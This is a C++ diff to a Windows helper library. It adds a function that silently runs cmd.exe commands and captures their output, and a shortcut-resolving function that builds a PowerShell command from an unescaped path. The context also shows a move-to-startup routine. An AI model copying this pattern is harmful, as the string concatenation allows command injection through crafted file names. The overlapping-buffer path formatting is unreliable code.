@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <iostream>
 #include <fstream>
+#include <string>
 
 //For username
 #include <Lmcons.h>
@@ -12,6 +13,10 @@
 
 //For selectFolder
 #include <shlobj.h>
+//
+
+//For quietShell
+#include <tchar.h>
 //
 
 //Compiler linkers: -s -static-libstdc++ -static-libgcc -static  -luser32 -lshlwapi -lole32 -lcomdlg32
@@ -118,4 +123,63 @@ extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {/
 
     return 0;
 }
-//
+
+extern "C" void __cdecl quietShell(std::string command, std::string& result) {
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+    HANDLE hStdoutRd, hStdoutWr;
+    CreatePipe(&hStdoutRd, &hStdoutWr, &saAttr, 0);
+    _STARTUPINFOW si;
+    ZeroMemory(&si, sizeof(_STARTUPINFOW));
+    si.cb = sizeof(_STARTUPINFOW);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = hStdoutWr;
+    si.hStdError = hStdoutWr;
+
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+
+    std::wstring commandWString = std::wstring(command.begin(), command.end());
+    std::wstring cmd = L"/c " + commandWString;
+    TCHAR cmdPath[MAX_PATH];
+    GetSystemDirectory(cmdPath, MAX_PATH);
+    _stprintf(cmdPath, _T("%s\\cmd.exe"), cmdPath);
+    std::wstring cmdPathWString(cmdPath, cmdPath + _tcslen(cmdPath));
+
+    if (!CreateProcessW(cmdPathWString.c_str(), &cmd[0], NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        DWORD errorCode = GetLastError();
+        LPSTR errorBuffer = nullptr;
+        FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
+                      NULL, errorCode, 0, (LPSTR)&errorBuffer, 0, NULL);
+        std::cerr << "CreateProcess failed: " << errorBuffer << std::endl;
+        LocalFree(errorBuffer);
+        return;
+    }
+    CloseHandle(hStdoutWr);
+
+    char buffer[1024];
+    DWORD bytesRead;
+    while (ReadFile(hStdoutRd, buffer, 1024, &bytesRead, NULL) && bytesRead > 0) {
+        result.append(buffer, bytesRead);
+    }
+
+    size_t pos = result.rfind('\n');
+    if (pos!= std::string::npos) {
+        result.erase(pos);
+    }
+
+    CloseHandle(hStdoutRd);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
+extern "C" void __cdecl getTargetPath(std::string lnk, std::string& result) {
+    quietShell("powershell.exe $lnkFile = '" + lnk + "'; $shell = New-Object -ComObject WScript.Shell; $shortcut = $shell.CreateShortcut($lnkFile); $targetPath = $shortcut.TargetPath; Write-Host $targetPath", result);
+    for (char& c : result) {
+        if (c == '\\') {
+            c = '/';
+        }
+    }
+}
